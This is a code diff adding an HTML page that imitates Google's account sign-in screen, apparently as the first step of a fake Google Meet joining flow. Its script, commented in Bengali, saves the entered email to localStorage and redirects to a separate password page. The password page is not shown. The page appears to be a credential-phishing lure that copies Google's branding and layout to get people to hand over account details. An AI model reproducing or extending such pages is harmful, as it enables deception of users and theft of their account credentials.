@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in Google Account</title>
+<link rel="icon" href="/Google meet/Google Meet joining/assets/google.png" type="image/x-icon">
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+    background-color: #fff;
+    color: #202124;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 60px 32px 24px;
+    opacity: 1;
+    transition: opacity 0.35s ease-in-out;
+  }
+
+  body.fade-out {
+    opacity: 0;
+  }
+
+  .main-wrap {
+    display: flex;
+    gap: 140px;
+    max-width: 1100px;
+    width: 100%;
+    align-items: center;
+    justify-content: center;
+    flex-wrap: wrap;
+  }
+
+  .left-box {
+    flex: 1;
+    min-width: 320px;
+    max-width: 460px;
+    text-align: left;
+  }
+
+  .logo-img {
+    width: 64px;
+    height: 64px;
+    display: block;
+    margin-bottom: 28px;
+    border-radius: 50%;
+    object-fit: contain;
+  }
+
+  .left-box h1 {
+    font-size: 40px;
+    font-weight: 400;
+    letter-spacing: -0.8px;
+    margin-bottom: 20px;
+    color: #202124;
+  }
+
+  .left-box .sub {
+    font-size: 18px;
+    line-height: 1.5;
+    color: #202124;
+  }
+
+  .right-box {
+    flex: 1;
+    min-width: 340px;
+    max-width: 440px;
+    width: 100%;
+  }
+
+  .input-wrap {
+    margin-bottom: 10px;
+  }
+
+  .input-wrap input {
+    width: 100%;
+    height: 58px;
+    border: 1.5px solid #dadce0;
+    border-radius: 6px;
+    padding: 14px 16px;
+    font-size: 17px;
+    color: #202124;
+    outline: none;
+    transition: border-color 0.15s, box-shadow 0.15s;
+  }
+
+  .input-wrap input:focus {
+    border-color: #1a73e8;
+    border-width: 2px;
+    padding-left: 15px;
+    box-shadow: 0 0 0 2px rgba(26,115,232,0.15);
+  }
+
+  .forgot-link {
+    display: inline-block;
+    font-size: 15px;
+    color: #1a73e8;
+    text-decoration: none;
+    font-weight: 500;
+    padding: 5px 0;
+    margin-bottom: 40px;
+  }
+  .forgot-link:hover { text-decoration: underline; }
+
+  .guest-text {
+    font-size: 15px;
+    color: #5f6368;
+    line-height: 1.6;
+    margin-bottom: 6px;
+  }
+  .guest-text a { color: #1a73e8; text-decoration: none; font-weight: 500; }
+  .guest-text a:hover { text-decoration: underline; }
+
+  .bottom-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 52px;
+  }
+
+  .create-link {
+    font-size: 15px;
+    color: #1a73e8;
+    text-decoration: none;
+    font-weight: 500;
+  }
+  .create-link:hover { text-decoration: underline; }
+
+  .next-btn {
+    background: #1a73e8;
+    color: #fff;
+    border: none;
+    border-radius: 22px;
+    padding: 12px 30px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.15s, box-shadow 0.15s;
+  }
+  .next-btn:hover {
+    background: #1557b0;
+    box-shadow: 0 2px 6px rgba(26,115,232,0.35);
+  }
+
+  footer {
+    width: 100%;
+    max-width: 1100px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 80px;
+    padding: 20px 0;
+    color: #5f6368;
+    font-size: 13px;
+  }
+  footer .lang select {
+    background: transparent;
+    border: none;
+    color: #5f6368;
+    font-size: 13px;
+    cursor: pointer;
+  }
+  footer .links a {
+    color: #5f6368;
+    text-decoration: none;
+    margin-left: 30px;
+    font-size: 13px;
+  }
+  footer .links a:hover { text-decoration: underline; }
+
+  @media (max-width: 860px) {
+    .main-wrap { flex-direction: column; gap: 60px; }
+    .left-box, .right-box { max-width: 100%; text-align: center; }
+    .logo-img { margin: 0 auto 28px; }
+  }
+</style>
+</head>
+<body>
+
+  <main class="main-wrap">
+    <div class="left-box">
+      <img src="../assets/google.png" alt="Logo" class="logo-img">
+      <h1>Sign in</h1>
+      <p class="sub">with your account to continue. This account will be available to other apps in the browser.</p>
+    </div>
+
+    <div class="right-box">
+      <form onsubmit="handleNext(event)">
+        <div class="input-wrap">
+          <input type="email" id="email" placeholder="Email or phone" required autocomplete="email">
+        </div>
+
+        <a href="#" class="forgot-link">Forgot email?</a>
+
+        <p class="guest-text">
+          Not your computer? Use Guest mode to sign in privately. 
+          <a href="#">Learn more about using Guest mode</a>
+        </p>
+
+        <div class="bottom-row">
+          <a href="#" class="create-link">Create account</a>
+          <button type="submit" class="next-btn">Next</button>
+        </div>
+      </form>
+    </div>
+  </main>
+
+  <footer>
+    <div class="lang">
+      <select aria-label="Language"><option>English (United States)</option></select>
+    </div>
+    <div class="links">
+      <a href="#">Help</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+    </div>
+  </footer>
+
+  <script>
+    function handleNext(event) {
+      event.preventDefault(); // ফর্মের ডিফল্ট সাবমিট বন্ধ করা
+      
+      const emailValue = document.getElementById('email').value;
+      
+      // ব্রাউজারের মেমোরিতে (localStorage) ইমেইল সেভ করে রাখা
+      localStorage.setItem('userEmail', emailValue);
+      
+      // বডিতে অ্যানিমেশন ক্লাস এড করা (যদি আপনার সিএসএস এ থাকে)
+      document.body.classList.add('fade-out');
+      
+      // পরের পেইজে রিডাইরেক্ট করা (আপনার ২য় পেইজের নাম অনুযায়ী 'name.html' পরিবর্তন করতে পারেন)
+      setTimeout(() => {
+        window.location.href = "./password/"; 
+      }, 350);
+    }
+  </script>
+
+</body>
+</html>
